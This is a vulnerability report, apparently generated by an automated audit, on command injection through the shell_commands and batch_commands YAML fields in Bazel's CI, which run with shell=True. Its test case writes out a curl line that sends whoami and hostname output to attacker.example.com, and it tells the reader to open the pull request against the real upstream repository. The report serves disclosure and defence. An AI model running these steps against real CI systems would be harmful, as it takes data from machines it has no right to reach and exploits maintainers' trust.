* Vulnerability Name: Command Injection via `shell_commands`/`batch_commands` in YAML pipeline configuration
* Description:
    1. A threat actor creates a pull request to a Bazel project that uses Bazel CI.
    2. The pull request modifies the `.bazelci/presubmit.yml` or a similar pipeline configuration YAML file in the project repository.
    3. In the modified YAML file, the threat actor injects malicious commands into the `shell_commands` (for Linux/macOS) or `batch_commands` (for Windows) sections of a task. For example, they could add commands to exfiltrate secrets, modify source code, or compromise the CI environment.
    4. If the pull request is merged, the Bazel CI system will execute the pipeline defined in the modified YAML.
    5. During the execution of the affected task, the injected malicious commands will be executed on Bazel's CI infrastructure.
* Impact:
    - **High/Critical**: Arbitrary code execution on Bazel's CI infrastructure. This could lead to:
        - Leakage of sensitive information, such as secrets, API keys, and internal code.
        - Modification of Bazel's source code or build artifacts.
        - Denial of service of the Bazel CI system.
        - Compromise of downstream projects tested by Bazel CI.
* Vulnerability Rank: Critical
* Currently Implemented Mitigations:
    - **Code Review**: The README.md explicitly states "*Please vet external contributions carefully as they can execute arbitrary code on our CI machines*". This highlights the reliance on manual code review to prevent malicious YAML configurations from being merged. This mitigation is described in `/code/README.md` and `/code/buildkite/README.md` under the "Pull Requests" section.
* Missing Mitigations:
    - **Input Validation and Sanitization**: The system lacks automated validation and sanitization of the YAML pipeline configuration, specifically the `shell_commands` and `batch_commands` fields, to prevent injection of arbitrary commands.
    - **Principle of Least Privilege**: While not directly related to this vulnerability, limiting the privileges of the CI execution environment could reduce the impact of successful command injection.
    - **Automated Configuration Validation**: Implement automated checks that parse and validate the YAML configuration to detect potentially malicious commands or patterns before pipeline execution.
* Preconditions:
    - An external threat actor needs to create a pull request to a Bazel project using Bazel CI.
    - A project member with merge permissions must merge the malicious pull request without properly vetting the changes to the YAML configuration.
* Source Code Analysis:
    1. **YAML Configuration Parsing**: The `bazelci.py` script is responsible for parsing the YAML configuration files (`presubmit.yml`, etc.). The `fetch_configs` and `load_config` functions in `bazelci.py` handle YAML parsing using `yaml.safe_load`.
    2. **Command Execution**: The `execute_commands` function in `bazelci.py` reads the `shell_commands` or `batch_commands` from the parsed YAML configuration and executes them using `execute_shell_commands` or `execute_batch_commands`. These functions use `subprocess.run` with `shell=True` to execute the commands.

    ```python
    def execute_commands(...):
        ...
        if platform == "windows":
            execute_batch_commands(task_config.get("batch_commands", None), print_cmd_groups)
        else:
            execute_shell_commands(task_config.get("shell_commands", None), print_cmd_groups)

    def execute_shell_commands(commands, print_group=True, group_message=":bash: Setup (Shell Commands)"):
        ...
        shell_command = "\n".join(["set -e"] + commands)
        execute_command([shell_command], shell=True)

    def execute_batch_commands(commands, print_group=True, group_message=":batch: Setup (Batch Commands)"):
        ...
        batch_commands = "&".join(commands)
        return subprocess.run(batch_commands, shell=True, check=True, env=os.environ).returncode
    ```
    3. **Vulnerability**: The use of `shell=True` in `subprocess.run` within `execute_shell_commands` and `execute_batch_commands` makes the system vulnerable to command injection. If a malicious user can control the content of `shell_commands` or `batch_commands` in the YAML configuration, they can inject arbitrary shell commands that will be executed by the Buildkite agent.
* Security Test Case:
    1. Fork the `bazelbuild/continuous-integration` repository (or any Bazel project using this CI setup).
    2. Create a new branch in your forked repository.
    3. Create or modify a YAML pipeline configuration file (e.g., `.bazelci/presubmit.yml`).
    4. In a task definition within the YAML file, add a malicious command to `shell_commands` (or `batch_commands` for Windows). For example, to test command execution on Linux/macOS, add:

    ```yaml
    shell_commands:
      - echo "Vulnerability Test Started"
      - whoami > /tmp/whoami.txt
      - hostname >> /tmp/whoami.txt
      - curl -F "file=@/tmp/whoami.txt" https://attacker.example.com/exfiltrate
      - echo "Vulnerability Test Completed"
    ```
    Replace `https://attacker.example.com/exfiltrate` with a URL you control to capture the exfiltrated data. For Windows, use `batch_commands` and equivalent Windows commands.
    5. Create a pull request with this branch against the original repository.
    6. If you have permissions to trigger a Buildkite pipeline for the target repository, trigger a build for your pull request. Otherwise, wait for a project member to trigger or merge the PR.
    7. After the pipeline runs, check the logs for the task where you injected the command. If the vulnerability is present, you should see the output of `whoami` and `hostname` in the logs, and your attacker-controlled server should receive a request containing the `/tmp/whoami.txt` file content.
    8. Alternatively, if you don't want to exfiltrate data, a simpler test case is to just run `whoami` or `hostname` and check if the output appears in the Buildkite logs for the step. For example:
    ```yaml
    shell_commands:
      - echo "Current user:"
      - whoami
      - echo "Hostname:"
      - hostname
    ```
    This test case will demonstrate arbitrary command execution on the CI machines, confirming the vulnerability.